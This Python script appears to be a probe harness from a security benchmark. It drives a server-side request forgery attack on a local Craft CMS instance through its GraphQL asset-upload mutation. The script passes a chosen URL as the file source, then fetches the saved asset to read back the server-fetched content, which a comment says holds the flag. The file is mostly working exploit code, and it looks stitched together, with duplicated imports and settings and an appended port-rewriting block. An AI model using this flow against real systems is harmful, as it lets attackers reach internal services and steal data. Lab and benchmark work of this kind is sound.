#!/usr/bin/env python3
"""Method-side executable probe: run a candidate dict against the target.
Usage: python3 seed_exec.py <candidate.json> [version]
"""
import sys, json, urllib.request, urllib.parse, time, subprocess
BASE = {
    "v0": "http://127.0.0.1:39530",
    "v1": "http://127.0.0.1:39531",
}
import argparse
import json
import os
import secrets
import sys
import time
import urllib.error
import urllib.request
from pathlib import Path
GQL_TOKEN = os.environ.get("PCB_GQL_TOKEN") or "pcb_gql_token_ssrf_ipv6_0001"
VOLUME_HANDLE = "pcbvol"
GQL_PATH = "/index.php?p=actions/graphql/api"
BASE = {
    "v0": "http://127.0.0.1:39530",
    "v1": "http://127.0.0.1:39531",
}
def run_probe(candidate, *, version="v1"):
    
    base = BASE[version]
    url = candidate["url"] if isinstance(candidate, dict) else str(candidate)
    fname = f"pcb_{secrets.token_hex(6)}.txt"
    mutation = (
        "mutation { save_%s_Asset(_file:{url:%s, filename:%s}) { id url filename } }"
        % (VOLUME_HANDLE, json.dumps(url), json.dumps(fname))
    )
    status, gql_body = _graphql(base, mutation)

    asset_url = None
    fetched_body = ""
    try:
        parsed = json.loads(gql_body)
    except Exception:
        parsed = None
    if isinstance(parsed, dict):
        node = (((parsed.get("data") or {}).get(f"save_{VOLUME_HANDLE}_Asset")) or {})
        asset_url = node.get("url")

    if asset_url:
        # Craft 用 CRAFT_PUBLIC_URL（compose 里硬编码 39530/39531）生成 asset url，
        # 但平台把容器端口映射到动态高位端口。用 PCB_TARGET_PORT 替换 asset_url 的
        # 主机端口，才能从宿主机读回 asset body（flag 所在）。
        _apt = _os_pcb.environ.get("PCB_TARGET_PORT")
        if _apt:
            import re as _re
            asset_url = _re.sub(r":\d+", f":{_apt}", asset_url, count=1)
        a_status, fetched_body = _http(asset_url, timeout=20)

    return {
        "version": version,
        "url": url,
        "mutation": mutation,
        "graphql_status": status,
        "graphql_body": gql_body[:2000],
        "asset_url": asset_url,
        "fetched_body": fetched_body,
    }
def _graphql(base: str, query: str, timeout: int = 30):
    body = json.dumps({"query": query}).encode()
    return _http(f"{base}{GQL_PATH}", data=body,
                 headers={"Content-Type": "application/json", "Accept": "application/json",
                          "Authorization": f"Bearer {GQL_TOKEN}"},
                 timeout=timeout)
def _http(url: str, *, data: bytes | None = None, headers: dict | None = None, timeout: int = 30):
    req = urllib.request.Request(url, data=data, headers=headers or {}, method="POST" if data else "GET")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.getcode(), r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:  
        return None, f"<http-error: {e}>"


import os as _os_pcb
_pbt = _os_pcb.environ.get("PCB_TARGET_BASE")
if _pbt:
    for _d in ("BASE", "HOSTPORT", "PORTS"):
        if _d in globals() and isinstance(globals()[_d], dict):
            for _v in list(globals()[_d]):
                globals()[_d][_v] = _pbt
_pt = _os_pcb.environ.get("PCB_TARGET_PORT")
if _pt:
    if "BASE" in globals() and isinstance(globals()["BASE"], dict):
        for _v in list(globals()["BASE"]):
            _val = globals()["BASE"][_v]
            if isinstance(_val, (tuple, list)):
                globals()["BASE"][_v] = (str(_val[0]), int(_pt))
            elif isinstance(_val, int) or (isinstance(_val, str) and _val.isdigit()):
                globals()["BASE"][_v] = int(_pt)
            else:
                globals()["BASE"][_v] = f"http://127.0.0.1:{int(_pt)}"
    for _d in ("HOSTPORT", "PORTS"):
        if _d in globals() and isinstance(globals()[_d], dict):
            for _v in list(globals()[_d]):
                _old = globals()[_d][_v]
                if isinstance(_old, (tuple, list)):
                    globals()[_d][_v] = (str(_old[0]), int(_pt))
                else:
                    globals()[_d][_v] = int(_pt)

if __name__ == "__main__":
    cand = json.load(open(sys.argv[1]))
    version = sys.argv[2] if len(sys.argv) > 2 else "v1"
    r = run_probe(cand, version=version)
    print(json.dumps(r, default=str))